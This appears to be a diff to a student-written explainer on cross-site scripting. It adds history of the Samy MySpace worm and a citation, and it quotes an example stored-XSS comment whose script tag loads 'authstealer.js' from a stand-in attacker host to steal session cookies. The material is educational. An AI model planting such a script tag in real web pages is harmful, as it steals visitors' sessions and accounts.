@@ -37,13 +37,22 @@ What is Cross-site scripting and Why is it Dangerous?
 	
 * There are two different types of XSS attacks, stored and reflective
 
-* Stored xss is "stored", or imbedded, on the website itself and steals data every time 
-  the website is visited. [xss-prevention]_ It is also known as "persistent XSS", 
-  and can be the more dangerous of the two types. [xss-attacks]_
+	* Stored xss is "stored", or imbedded, on the website itself and steals data every time 
+	  the website is visited. [xss-prevention]_ It is also known as "persistent XSS", 
+	  and can be the more dangerous of the two types. [xss-attacks]_
 
-* Reflective xss is stored in a link embedded in the website that the user has to 
-  click on to activate. [xss-attacks]_ 
+	* Reflective xss is stored in a link embedded in the website that the user has to 
+	  click on to activate. [xss-attacks]_ 
+ 
+  
+* XSS attacks have been around since the start of the web, first becoming a problem when 
+  JavaScript langauage was introduced to the web application world. [Grossman]_
 
+* One of the earliest XSS worms was known as "Samy", which was a small code that 
+  a 19 put in his MySpace profile to add anyone who viewed his profile as a friend. 
+  But it also added the code invisible to everyone who viewed it, and quickly 
+  multiplied exponentially, adding over one million friend requests in just over  
+  24 hours before MySpace took the website down. [Grossman]_ [Franceschi]_ 
 
 What Can Be Done to Prevent XSS through Web Security
 ----------------------------------------------------
@@ -92,7 +101,9 @@ Example of Cross-Site Scripting:
 	
 * Stored XSS Example: An attacker figures out that the comment section of a website can store 
   HTML tags. They leave a comment that says: 
+  
   "Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>" [xss-attacks]_
+  
   This is a stored in the website, and every time someone visits the page, they have their 
   session cookies stolen
 
@@ -111,6 +122,8 @@ Sources
 .. [xss-attacks] "`Cross Site Scripting (XSS) Attacks <https://www.incapsula.com/web-application-security/cross-site-scripting-xss-attacks.html>`_." Incapsula.com. Imperva, n.d. Web. 18 Feb. 2017.
 
 .. [xss-prevention] "`Everything You Need to Know About Preventing Cross-Site Scripting Vulnerabilities in PHP - Paragon Initiative Enterprises Blog <https://paragonie.com/blog/2015/06/preventing-xss-vulnerabilities-in-php-everything-you-need-know>`_." RSS. Paragon Initiative Enterprises , 16 June 2015. Web. 19 Feb. 2017. 
+
+.. [Franceschi] Franceschi-Bicchierai, Lorenzo. "`The MySpace Worm that Changed the Internet Forever. <https://motherboard.vice.com/en_us/article/the-myspace-worm-that-changed-the-internet-forever>`_." Motherboard. Motherboard, 04 Oct. 2015. Web. 23 Feb. 2017. 
 
 .. [Grossman] Grossman, Jeremiah. XSS Attacks: Cross-site Scripting Exploits and Defense. N.p.: Syngress, 2007. Print. 
 
